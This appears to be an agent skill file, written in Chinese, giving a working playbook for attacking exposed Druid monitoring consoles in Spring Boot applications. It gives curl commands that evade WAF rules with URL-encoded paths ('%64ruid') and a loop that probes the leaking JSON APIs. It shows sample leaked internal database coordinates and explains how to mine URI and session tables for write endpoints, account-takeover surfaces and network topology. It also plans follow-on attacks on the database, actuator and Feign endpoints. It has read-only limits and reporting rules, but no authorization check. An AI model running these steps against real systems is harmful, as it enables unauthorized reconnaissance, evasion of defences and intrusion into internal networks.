---
name: druid-console-unauth
description: "打 Druid 监控控制台未授权时用:%64ruid 绕 WAF,只读四表拿内网坐标。"
version: 1.0.0
license: MIT
author: hermes-curator
metadata:
  hermes:
    tags: [pentest, middleware, java, spring, druid, unauth]
    related_skills: [middleware-unauth-family, spring-actuator-cloud-takeover, heapdump-credential-hunter, pentest-report-autogen]
---

# Druid 监控控制台未授权 (StatViewServlet)

Spring Boot / Java 应用标配的 Druid 监控台。**命中即拿三样东西**: 内网 DB 坐标、内网多级转发链、全量内部 URI 清单。
它是**信息泄露类**发现 —— 拿到的是「打下去的地图」, 不是 shell。

## When to Use

- 指纹命中: 页面/JS 含 `druid.common.buildHead()`、`/druid/index.html`、`Druid Stat`
- 目标栈是 Spring Boot 且出现过 `/actuator/*`(两者常同机共存)
- 已有一个能发 HTTP 的立足点(直连 / SSRF 回显 / 代理), 且该端口不是网关前置鉴权面
- 同样适用于 `doris-unauth` / `etcd-unauth` / `nacos-authscope-unauth` 同一家族的其他 Java 中间件

## 0. 纪律(先读)

1. **只 GET 读四张表**(`datasource.json` `webapp.json` `weburi.json` `websession.json`)。
2. **不执行任何 SQL、不改配置/密码、不导全量业务数据**。
3. **`reset-all.json` 是写操作**(重置内存统计): 只在必须验证可用性时调一次, 并在报告里单列一条如实披露。
4. `SESSIONID` 是观测值, **不要拿去重放/接管**(那是另一条红线, 需单独授权)。
5. 拿到内网坐标后**不要在无立足点时硬连** —— 先把坐标/网段/链路写进报告, 走正常扩权或隧道流程。

## 1. 入口与编码绕过

```bash
# 直连(常被 WAF 按【字面】druid 关键字拦)
curl -s -k -m 15 "http://<IP>:<PORT>/druid/index.html"
# URL 编码绕: WAF 若在解码前匹配字面量, 整条规则失效
curl -s -k -m 15 "http://<IP>:<PORT>/%64ruid/index.html"     # %64 = d
# 其他等价变形
/%64%72uid/index.html      /druid/%69ndex.html      /druid/index.html;.js
```

- **控制台 UI 返回 302 / 登录页, 不代表 JSON API 不可达** —— 多数部署只给 UI 加了跳转, API 裸奔。
- 版本: 1.1.x 的 `index.html` 含 `druid.common.buildHead()` / `druid.lang`; 1.2.x 结构不同。
- 页面内联的环境变量(test/pre/prod 标识)用来判断该实例属于哪个环境, 写报告要写明。

## 2. ★ 必跑可用性矩阵(逐条 curl, 不要只看一条)

```bash
for p in datasource.json webapp.json weburi.json websession.json index.json sql.json sqlstat.json spring.json druid_stat.json; do
  printf '%-22s ' "$p"; curl -s -k -m 15 "http://<IP>:<PORT>/druid/$p" | head -c 220; echo
done
```

| JSON API | 通 | 泄露什么 |
|---|---|---|
| `datasource.json` | ✅ | **内网 JDBC URL + 库名 + 账号** + 驱动/连接池参数/Filter 链 |
| `weburi.json` | ✅ | **全量 URI 统计 = 免费攻击面地图**(内部写接口 / 健康端点 / 应用名) |
| `websession.json` | ✅ | **SESSIONID + `RemoteAddress` 里的内网多级转发链** |
| `webapp.json` | ✅ | ContextPath / 请求量 |
| `index.json` `sqlstat.json` `druid_stat.json` | ❌ | `{"ResultCode":-1,"Content":"Do not support this request, please contact with administrator."}` |
| `sql.json` `spring.json` | ⚠️ | `{"ResultCode":1,"Content":null}` = 端点存在但空(启用 WallFilter 时 SQL 面取不到) |
| `activeConnectionStackTrace-{datasourceId}.json` | ⚠️ | 仅在 `removeAbandoned=true` 时有数据; **返回空 ≠ 端点不存在** |

- `api.html` 会列出该实例支持的**全部** JSON API(含带 `{id}` 的模板路径) ⇒ 按它逐条试, 不要凭记忆猜端点。
- 完整结构、字段读法、转发链语义、端点字典: `references/druid-json-api-matrix.md`

## 3. 四张表的读法

### 3.1 `datasource.json`

```json
{"ResultCode":1,"Content":[{"Identity":284995829,"Name":"DataSource-284995829",
 "DbType":"postgresql","DriverClassName":"org.postgresql.Driver",
 "URL":"jdbc:postgresql://192.168.66.185:5434/cft_loans","UserName":"cft_loans_admin",
 "FilterClassNames":["...StatFilter","...WallFilter"],"MaxActive":20}]}
```

- `URL` + `UserName` = **内网坐标**(DB 类型 / 内网 IP / 非默认端口 / 库名 / 账号) —— 后续横向与取数的起点。
- **该 JSON 结构本身没有 password 字段**(Druid `DataSourceStat` 固有) ⇒ 报告里**绝不要写「数据库口令已泄露」**。
- `FilterClassNames` 含 `WallFilter` ⇒ 解释了为什么 `sql.json` 空。
- `Identity` 就是 `datasource-{id}.json` / `activeConnectionStackTrace-{id}.json` 的 id。

### 3.2 `weburi.json`(优先榨)

每条形如 `{"URI":"/api/h5/certificate/save","RequestCount":167,"LastAccessTime":"...","RequestTimeMillisMax":331}`。

- 一张表拿到**内部完整端点清单**, 含前端从未调用、只在服务端间调用的接口。
- **重点挑这几类**再进一步(只做最小只读验证, 不批量):
  - 写语义: `*/save` `*/submit` `*/update*` `*/callback/*` `*/reset*`
  - 账号接管敏感面: 改绑手机/邮箱、短信验证码记录查询(`*/sms-valid/selectByExample`)、`*/login/log`
  - 库表枚举器: `*/queryIsExistTable`(可被滥用做 schema 摸索)
  - **健康检查端点**: `/actuator/<app-name>-<32位hex>-health` ⇒ 一次泄露 Spring Boot **应用名 + 实例标识**
  - 内部 Feign 面: `/xxx-web/feign/*`
- **★ 区分「本就存在的业务接口」与「我方探测痕迹」**(`/error_404`、`.env`、`actuator` 这些是自己刚打的), 报告里不要把后者当发现。

### 3.3 `websession.json`

- `RemoteAddress` 是**逗号分隔的链**: 最后一个是应用服务器内网地址, 中间是各级代理/LB, 最前是客户端公网出口
  ⇒ 一张表还原「公网 → 代理层 → 应用层」的**跳数与网段**。
- 多条不同中间跳并存 ⇒ 存在**多条网关链 / 多可用区**, 是内网拓扑建模的原材料。
- `UserAgent` 用来自证某条会话是不是**自己发的**(`curl/x.y.z` 基本就是探针) ⇒ 别把探针会话写成「受害者会话」。

### 3.4 `webapp.json`

ContextPath + 请求量, 用来确认这实例是主站还是边缘服务。

## 4. 写报告的口径(必须遵守)

- **禁止未验证的绝对断言**。写「**全被禁 / 全部 404 / 无此面**」之前必须跑完第 2 节的矩阵。
  只测一个端点的 302 就写「全部被禁」, 后续要补一节「更正」还要回头改汇总表 —— 成本远高于当场跑完。
  结论被推翻时, 在报告里显式给出「**原表述 → 更正**」对照表, 不要静默改正文。
- **凭据口径要写清是哪种**: 「该接口返回结构不含 password 字段」≠「我漏写了」。
  含糊打码会让用户以为你隐瞒; 拿不到就明说拿不到。
- 用户要求「**完整未脱敏**」时: 真实 IP/端口/内网坐标/端点全路径/接口返回原文/SESSIONID/URI 清单**全部照录**;
  且**动笔前先回产物目录捞原始值**(`ls` 跳板机与本地的 `*_dump/` `*_raw/` 目录) ——
  真值常就躺在那里, 被要求不打码时写 `[REDACTED]` 等于漏交。
- 每一行结论都要能指到一条 `.out` / 原始响应; 指不出来的降级为「待验证」。
- 报告交付流程(分片写 + cat 合并 + 章节/尾部校验 + 桌面副本 + `MEDIA:` 路径)见 `pentest-report-autogen`。

## 5. 拿到之后能干什么

1. **内网 DB 坐标** → 规划打 DB(需内网可达性): 库名/账号已知, 差的是密码与网络路径。
2. **URI 清单** → 找下一批攻击面: `*/save` `*/submit` 打未授权写、`/actuator/*` 打 actuator 链、`/xxx-web/feign/*` 打 Feign 面。
3. **转发链** → 判断有没有同段可比对的内网目标, 供后续内网探测。
4. **同一单位的其他环境要分别复测**(prod/pre/test): Druid 暴露常只出现在某一个环境的实例上。

## 6. 常见坑

- 只看 UI 的 302 就判死 ⇒ 先跑矩阵(第 2 节)。
- 把 `datasource.json` 没有 password 字段当成「自己没抓到」⇒ 那是固有结构, 写清口径。
- 把 `activeConnectionStackTrace-*.json` 的空返回当成端点不存在 ⇒ 是 `removeAbandoned=false` 导致。
- 把 `weburi.json` 里自己的探测痕迹当业务发现 ⇒ 出锅数据必须区分归因。
- 用 URL 编码绕过后忘了**同时记录编码形式**(`%64ruid`) —— 复现命令要能原样粘贴。

## 7. 参考

- `references/druid-json-api-matrix.md` —— 四表完整 JSON 结构与字段读法、`api.html` 端点字典、转发链语义、落盘/取证建议。
